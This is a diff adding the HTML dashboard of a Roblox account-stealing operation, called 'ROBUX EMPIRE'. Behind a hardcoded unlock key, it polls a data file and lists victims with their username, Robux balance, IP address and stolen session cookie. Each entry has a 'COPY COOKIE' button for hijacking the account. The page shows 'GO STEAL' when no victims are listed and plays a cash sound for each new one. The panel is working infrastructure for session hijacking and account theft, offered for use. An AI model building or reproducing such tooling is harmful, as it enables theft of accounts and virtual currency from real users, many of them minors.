@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>ROBUX EMPIRE</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&display=swap');
+    body{margin:0;background:linear-gradient(135deg,#ff00aa,#00ffff,#ffff00);font-family:'Poppins',sans-serif;color:#000;overflow-x:hidden;}
+    .login{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:999;}
+    .login h1{font-size:60px;color:#0ff;text-shadow:0 0 30px #0ff,0 0 60px #f0f;}
+    .inputbox{position:relative;width:400px;margin:15px;}
+    .inputbox input{padding:20px;font-size:24px;width:100%;border:none;border-radius:50px;background:#fff;color:#000;font-weight:bold;text-align:center;}
+    .eye{position:absolute;right:20px;top:20px;cursor:pointer;font-size:28px;color:#0ff;}
+    .login button{padding:20px;width:400px;font-size:24px;border:none;border-radius:50px;background:#0ff;color:#000;font-weight:800;cursor:pointer;box-shadow:0 0 40px #0ff;}
+    .login button:hover{transform:scale(1.1);box-shadow:0 0 80px #f0f;}
+    .main{display:none;padding:40px;min-height:100vh;}
+    .header{text-align:center;margin-bottom:40px;}
+    .header h1{font-size:70px;color:#fff;text-shadow:0 0 40px #000,0 0 80px #0ff;}
+    .total{background:linear-gradient(45deg,#0ff,#f0f);padding:30px;border-radius:30px;box-shadow:0 0 60px rgba(0,255,255,0.8);margin:30px auto;max-width:800px;}
+    .total h2{font-size:50px;color:#000;text-shadow:0 0 20px #fff;}
+    .total span{font-size:80px;color:#000;font-weight:900;}
+    .logs{max-width:1200px;margin:0 auto;}
+    .log{background:rgba(255,255,255,0.95);border-radius:25px;padding:25px;margin:25px 0;box-shadow:0 0 40px rgba(0,255,255,0.6);display:flex;align-items:center;transition:0.3s;}
+    .log:hover{transform:translateY(-10px);box-shadow:0 0 80px #0ff;}
+    .avatar{width:120px;height:120px;border-radius:50%;border:6px solid #0ff;box-shadow:0 0 30px #0ff;margin-right:30px;}
+    .info{flex:1;}
+    .info h3{font-size:32px;color:#000;margin:0;}
+    .info p{font-size:18px;color:#333;margin:6px 0;}
+    .robux{color:#0f0;font-weight:900;font-size:28px;}
+    .copy{background:#0ff;color:#000;padding:15px 30px;border-radius:50px;font-weight:bold;cursor:pointer;box-shadow:0 0 30px #0ff;}
+    .copy:hover{background:#f0f;}
+  </style>
+</head>
+<body>
+  <div class="login" id="login">
+    <h1>ROBUX EMPIRE</h1>
+    <div class="inputbox">
+      <input type="password" id="key" placeholder="ENTER KEY">
+      <span class="eye" onclick="toggleKey()">Eye</span>
+    </div>
+    <button onclick="unlock()">UNLOCK EMPIRE</button>
+  </div>
+
+  <div class="main" id="main">
+    <div class="header">
+      <h1>TOTAL ROBUX: <span id="total">0</span></h1>
+    </div>
+    <div class="total">
+      <h2>EMPIRE VALUE</h2>
+      <span id="total2">0</span> Robux
+    </div>
+    <div class="logs" id="logs">Loading...</div>
+  </div>
+
+  <script>
+    const KEY = "01axrch";
+    let lastCount = 0;
+
+    function toggleKey() {
+      const i = document.getElementById('key');
+      const e = document.querySelector('.eye');
+      i.type = i.type === 'password' ? 'text' : 'password';
+      e.textContent = i.type === 'password' ? 'Eye' : 'Hide';
+    }
+
+    function unlock() {
+      if (document.getElementById('key').value === KEY) {
+        document.getElementById('login').style.display = 'none';
+        document.getElementById('main').style.display = 'block';
+        load();
+        setInterval(load, 4000);
+      } else {
+        alert("WRONG KEY DUMBASS");
+      }
+    }
+
+    async function load() {
+      try {
+        const res = await fetch('data.json?t=' + Date.now());
+        const d = await res.json();
+        let t = 0;
+        const h = d.map(c => {
+          t += Number(c.robux);
+          return `<div class="log"><img src="${c.headshot}" class="avatar" onerror="this.src='https://i.imgur.com/removed.png'"><div class="info"><h3>${c.user} (@${c.display})</h3><p class="robux">${Number(c.robux).toLocaleString()} Robux • RAP: ${Number(c.rap).toLocaleString()}</p><p>IP: ${c.ip} • ${c.time}</p><button class="copy" onclick="navigator.clipboard.writeText('${c.cookie}')">COPY COOKIE</button></div></div>`;
+        });
+        document.getElementById('total').textContent = t.toLocaleString();
+        document.getElementById('total2').textContent = t.toLocaleString();
+        document.getElementById('logs').innerHTML = h.join('') || "<h1 style='text-align:center;color:#fff;'>No victims yet — GO STEAL</h1>";
+        if (d.length > lastCount) {
+          // CASH SOUND
+          const audio = new Audio('https://cdn.discordapp.com/attachments/1298475629385744394/1298475688884625420/alert.mp3');
+          audio.play().catch(() => {});
+        }
+        lastCount = d.length;
+      } catch (e) {
+        document.getElementById('logs').innerHTML = "<h1 style='color:#f00;'>ERROR LOADING EMPIRE</h1>";
+      }
+    }
+  </script>
+</body>
+</html>
